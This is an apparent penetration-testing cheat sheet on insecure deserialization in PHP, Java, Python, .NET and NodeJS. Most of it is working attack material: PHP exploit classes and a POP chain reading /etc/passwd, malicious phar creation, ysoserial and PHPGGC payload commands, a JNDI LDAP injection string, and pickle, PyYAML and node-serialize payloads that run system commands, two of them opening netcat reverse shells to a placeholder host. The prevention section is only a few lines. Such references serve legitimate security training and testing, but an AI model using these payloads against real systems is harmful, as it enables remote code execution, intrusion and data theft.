# Insecure Deserialization

## Table of Contents

- [Understanding Deserialization](#understanding-deserialization)
- [Detection](#detection)
- [PHP Deserialization](#php-deserialization)
- [Java Deserialization](#java-deserialization)
- [Python Deserialization](#python-deserialization)
- [.NET Deserialization](#net-deserialization)
- [NodeJS Deserialization](#nodejs-deserialization)
- [Tools](#tools)

---

## Understanding Deserialization

Serialization converts objects to transportable format (bytes, JSON, XML).
Deserialization reconstructs objects from that format.

**Vulnerable when:** User-controlled data is deserialized without validation.

### Impact

- Remote Code Execution (RCE)
- Privilege Escalation
- Authentication Bypass
- IDOR (Insecure Direct Object Reference)

---

## Detection

### Signs of Serialized Data

| Format | Signature |
| --- | --- |
| PHP | `O:4:"User":2:{s:4:"name"...` |
| Java | `AC ED 00 05` (hex) or `rO0A` (base64) |
| Python Pickle | `\x80\x04\x95` or `(dp0` |
| .NET | `AAEAAAD/////` (base64) |
| JSON | Nested objects with type hints |

### Where to Look

- Cookies (base64 encoded)
- Hidden form fields
- API responses
- Session data
- File uploads
- Database entries

---

## PHP Deserialization

### Magic Methods

| Method | Triggered When |
| --- | --- |
| `__construct()` | Object created |
| `__destruct()` | Object destroyed |
| `__wakeup()` | Object unserialized |
| `__toString()` | Object converted to string |
| `__call()` | Inaccessible method called |

### Basic Exploit

```php
<?php
// Vulnerable code
$data = unserialize($_COOKIE['user']);

// Exploit class
class Exploit {
    public $cmd = 'id';
    public function __destruct() {
        system($this->cmd);
    }
}

// Generate payload
$payload = new Exploit();
$payload->cmd = 'id';
echo serialize($payload);
// O:7:"Exploit":1:{s:3:"cmd";s:2:"id";}
?>
```

### Property-Oriented Programming (POP) Chain

```php
<?php
// Target application has these classes
class FileReader {
    public $file;
    public function __toString() {
        return file_get_contents($this->file);
    }
}

class Logger {
    public $message;
    public function __destruct() {
        echo $this->message;
    }
}

// Chain: Logger::__destruct() -> FileReader::__toString() -> file_get_contents()
$reader = new FileReader();
$reader->file = '/etc/passwd';

$logger = new Logger();
$logger->message = $reader;

echo serialize($logger);
?>
```

### Phar Deserialization

```shell
# Create malicious phar
php -r '
class Evil { public function __destruct() { system("id"); } }
$phar = new Phar("evil.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(new Evil());
$phar->stopBuffering();
'

# Trigger via file functions
# file_exists("phar://evil.phar")
# file_get_contents("phar://evil.phar/test.txt")
```

---

## Java Deserialization

### Java Detection

```shell
# Base64 signature
rO0AB

# Hex signature
AC ED 00 05
```

### Common Gadget Libraries

| Library | Vulnerability |
| --- | --- |
| Commons Collections | Multiple versions |
| Spring Framework | Various gadgets |
| Hibernate | ORM exploitation |
| JBoss | JMXInvokerServlet |

### Using ysoserial

```shell
# Download
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar

# Generate payload
java -jar ysoserial-all.jar CommonsCollections1 'id' > payload.bin
java -jar ysoserial-all.jar CommonsCollections5 'bash -c {echo,BASE64_CMD}|{base64,-d}|{bash,-i}' > payload.bin

# Base64 encode
cat payload.bin | base64 -w0

# Common gadgets
java -jar ysoserial-all.jar CommonsCollections1 'command'
java -jar ysoserial-all.jar CommonsCollections5 'command'
java -jar ysoserial-all.jar CommonsCollections6 'command'
java -jar ysoserial-all.jar CommonsCollections7 'command'
java -jar ysoserial-all.jar Jdk7u21 'command'
java -jar ysoserial-all.jar Spring1 'command'
```

### JNDI Injection (Log4Shell style)

```shell
# Start LDAP server
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "command" -A $lhost

# Payload
${jndi:ldap://$lhost:1389/exploit}
```

---

## Python Deserialization

### Pickle

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
print(payload)
```

### One-liner Generator

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f'
        return os.system, (cmd,)

print(base64.b64encode(pickle.dumps(RCE())).decode())
```

### PyYAML

```yaml
# Vulnerable: yaml.load(data)
# Safe: yaml.safe_load(data)

!!python/object/apply:os.system ['id']

# Or
!!python/object/new:subprocess.check_output [['id']]
```

### jsonpickle

```json
{
    "py/reduce": [
        {"py/function": "os.system"},
        {"py/tuple": ["id"]}
    ]
}
```

---

## .NET Deserialization

### Common Formatters

| Formatter | Risk Level |
| --- | --- |
| BinaryFormatter | Critical |
| SoapFormatter | Critical |
| ObjectStateFormatter | Critical |
| LosFormatter | Critical |
| NetDataContractSerializer | Critical |
| Json.NET (with TypeNameHandling) | High |

### Using ysoserial.net

```shell
# Download from https://github.com/pwntester/ysoserial.net

# Generate payload
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "command" -o base64
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "command" -o base64

# ObjectDataProvider (common in XAML)
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c id" -o raw
```

### ViewState Exploitation

```shell
# If ViewState MAC is disabled or key is known
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "command" --path="/" --apppath="/" --decryptionalg="AES" --decryptionkey="KEY" --validationalg="SHA1" --validationkey="KEY"
```

---

## NodeJS Deserialization

### node-serialize

```javascript
// Vulnerable code
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\',function(error,stdout,stderr){console.log(stdout)})}()"}';
serialize.unserialize(payload);
```

### Payload Generator

```javascript
var y = {
    rce: function(){
        require('child_process').exec('id', function(error, stdout, stderr) {
            console.log(stdout);
        });
    }
}
var serialize = require('node-serialize');
console.log(serialize.serialize(y));
```

### IIFE Payload

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nc $lhost $lport -e /bin/bash')}()"}
```

---

## Tools

### ysoserial (Java)

```shell
# List available gadgets
java -jar ysoserial-all.jar

# Usage
java -jar ysoserial-all.jar <gadget> '<command>'
```

### ysoserial.net (.NET)

```shell
# List gadgets
ysoserial.exe -l

# Usage
ysoserial.exe -g <gadget> -f <formatter> -c "<command>"
```

### PHPGGC (PHP)

```shell
# Clone
git clone https://github.com/ambionics/phpggc.git

# List gadgets
./phpggc -l

# Generate payload
./phpggc Laravel/RCE1 system id
./phpggc Symfony/RCE4 system id
./phpggc Monolog/RCE1 system id

# Generate phar
./phpggc -p phar -o exploit.phar Monolog/RCE1 system id
```

### Burp Extension: Java Deserialization Scanner

```text
1. BApp Store â†’ Java Deserialization Scanner
2. Right-click request â†’ Extensions â†’ Java Deserialization Scanner
```

---

## Quick Reference

| Language | Library/Format | Tool |
| --- | --- | --- |
| Java | Commons Collections, etc. | ysoserial |
| PHP | serialize() | PHPGGC |
| Python | Pickle, PyYAML | Custom scripts |
| .NET | BinaryFormatter, etc. | ysoserial.net |
| NodeJS | node-serialize | Custom scripts |

---

## Prevention Notes

Detection in logs:

- Error messages during deserialization
- Stack traces with serialization classes
- DNS/HTTP callbacks to attacker server
- Process spawning from web application

---

## ðŸ“š See Also

### Related Web Attacks

- **[Web Application Analysis](7.0.Web-Application-Analysis.md)** - Reconnaissance and vulnerability discovery
- **[XXE](7.7.XXE.md)** - Similar parsing vulnerability
- **[Command Injection](7.4.Command-Injection.md)** - RCE via command execution

### Post-Exploitation

- **[Reverse Shell](../6.OS-Command/6.3.Reverse-Shell.md)** - Payloads after deserialization RCE
